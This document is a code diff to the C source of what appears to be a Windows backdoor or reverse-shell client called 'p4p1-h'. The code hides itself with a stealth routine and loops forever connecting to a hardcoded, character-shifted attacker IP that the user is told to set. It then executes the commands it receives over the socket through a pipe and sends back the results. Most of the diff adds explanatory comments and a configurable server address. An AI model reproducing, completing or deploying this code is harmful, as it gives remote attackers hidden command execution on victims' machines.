@@ -1,15 +1,37 @@
 #include "p4p1-h_win.h"
 
+#define SERVER_IP "97/358/316/213" //edit this with your own ip + 1 char
+
+/*
+ * Main function
+ */
 int main(int argc, char * argv[])
 {
+	/* Activate stealth so that the program runs in
+	 * background
+	 */
 	if(argc == 1)
 		stealth();
 
+	/*
+	 * initialize main structure with all of the variables
+	 */
 	fileWrapper file;
 
-	//Main program
+	/*
+	 * Main while loop
+	 * for constant execution
+	 */
 	while(1){
+
+		/*
+		 * initialize all of the variables
+		 */
 		setupvar(&file);
+
+		/*
+		 * main function where the magic is :)
+		 */
 		main_loop(&file);
 	}
 
@@ -19,11 +41,11 @@ int main(int argc, char * argv[])
 int main_loop(fileWrapper * file)
 {
 	/* setup variables */
-	int cn;													//command pipe
-	int bytesSent;                  //number of bytes ent
-	int bytesRecv;              // number of bytes received
-	char sessionID[5] = "";					// Session id given by serv
-	char buf[BUFSIZE] = "";					//buf
+	int cn;							// connection indicator										//command pipe
+	int bytesSent;                  			// number of bytes sent
+	int bytesRecv;              				// number of bytes received
+	char sessionID[5] = "";					// Session id given by server
+	char buf[BUFSIZE] = "";					// buf
 
 	bytesSent = 0;
 	bytesRecv = SOCKET_ERROR;
@@ -32,20 +54,23 @@ int main_loop(fileWrapper * file)
 	int * pbs = &bytesSent;
 	int * pbr = &bytesRecv;
 
-	/* connect */
-
+	/* connection
+ 	 * to the main server
+	 */
 	connected(file, &cn);
 
 	/* receive session ID */
 	if(cn != SOCKET_ERROR){
 
-		/*Recv sessionID*/
-		*pbr = SOCKET_ERROR;
-		sessionID[0] = wrecvsid(file->s, BUFSIZE, pbr);
+		*pbr = SOCKET_ERROR;					// setup var to recv full session id
+		sessionID[0] = wrecvsid(file->s, BUFSIZE, pbr);		// receuve the session id
+									// and declare it to the var
 
-		/*Send ui with session id*/
-		if(sendui(file->s, sessionID[0], pbs) == 1){
-			goto close;
+		/* Send a small user interface if the session id is not 5 aka
+		 * not the default server
+		 */
+		if(sendui(file->s, sessionID[0], pbs) != 5){
+			goto close;					// an error ocured restart the app
 		}
 
 	}
@@ -53,19 +78,29 @@ int main_loop(fileWrapper * file)
 	 *End of session id blocks
 	 **/
 
+	/*
+	 * While connected loop
+	 **/
 	while(cn != SOCKET_ERROR){
 
 		/*
-		 *Send Prompt if no session ID
+		 * Send Prompt if no session ID aka using netcat
 		 **/
-		 if(sendprompt(file->s, sessionID[0]) < 0){
-			 goto close;
-		 }
-		 memset(file->buf, 0, BUFSIZE);
+		if(sendprompt(file->s, sessionID[0]) < 0){
+			 goto close;				// error restart app
+		}
 
+		memset(file->buf, 0, BUFSIZE);			// Reset the buffer
+
+		/*
+		 * While loop to process the reseived data
+		 */
 		*pbr = SOCKET_ERROR;
-
 		while(*pbr == SOCKET_ERROR){
+
+			/*
+			 * Actual recv func to recv data sent by user
+			 */
 			*pbr = recv(file->s, file->buf, BUFSIZE, 0);
 			if(*pbr == 0 || *pbr == WSAECONNRESET){
 				break;
@@ -74,7 +109,9 @@ int main_loop(fileWrapper * file)
 			if(bytesRecv < 0){
 				return -1;
 			} else {
-				/*process received data*/
+				/*
+				 * process received data to detremine if a special command or not
+				 */
 				int q = processdata(file->s, file->buf[0], file->buf[1]);
 				if(q < 0){
 
@@ -82,11 +119,16 @@ int main_loop(fileWrapper * file)
 
 				} else if(q == 1) {
 
-					//special command aka do nothing
+					/*
+					 * reset buf on special command executed
+					 */
 					memset(file->buf, 0, BUFSIZE);
 
 				} else{
 
+					/*
+					 * Execute the commad if its not a special one
+					 */
 					if (executeCommand(file) > 0){
 						goto close;
 					}
@@ -97,7 +139,10 @@ int main_loop(fileWrapper * file)
 
 
 
-	}	// end of the while connected loop.
+	}
+	/*
+	 * end of While connected loop
+	 **/
 	close:
 	_pclose(file->pPipe);
 	WSACleanup();
@@ -129,7 +174,7 @@ int setupvar(fileWrapper * file)
 	}
 
 	if(fip == NULL){
-		char ipjib[14] = "97/358/316/213";
+		char ipjib[14] = SERVER_IP;
 		char corip[15];
 
 		int i;
